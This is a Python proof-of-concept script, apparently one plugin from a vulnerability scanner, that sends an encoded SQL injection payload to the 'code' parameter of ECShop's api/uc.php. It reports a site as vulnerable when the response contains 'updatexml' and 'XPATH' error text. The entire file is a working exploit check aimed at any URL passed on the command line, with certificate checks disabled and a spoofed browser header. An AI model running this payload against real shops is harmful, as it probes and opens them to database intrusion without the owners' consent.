#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: ecshop uc.php参数code SQL注入
referer: http://www.wooyun.org/bugs/WooYun-2016-174468
author: Lucifer
description: 文件uc.php中,参数code存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['ecshop uc.php参数code SQL注入', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/api/uc.php?code=6116diQV4NziG3G8ttFnwTYmEp60E3K27Q0fDWaey%2bTuNLsGKdb1%2b6bPFT%2fIjJEMPlzS5Tm3InnRZKczTQBFXzXmDD5bs4Il5pbFswzA9SWE4gqcbuN8LgLJlTQqvVeSRUfFn4dhgto6yjPsJp7Za6GJEQ"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"updatexml" in req.text and r"XPATH" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
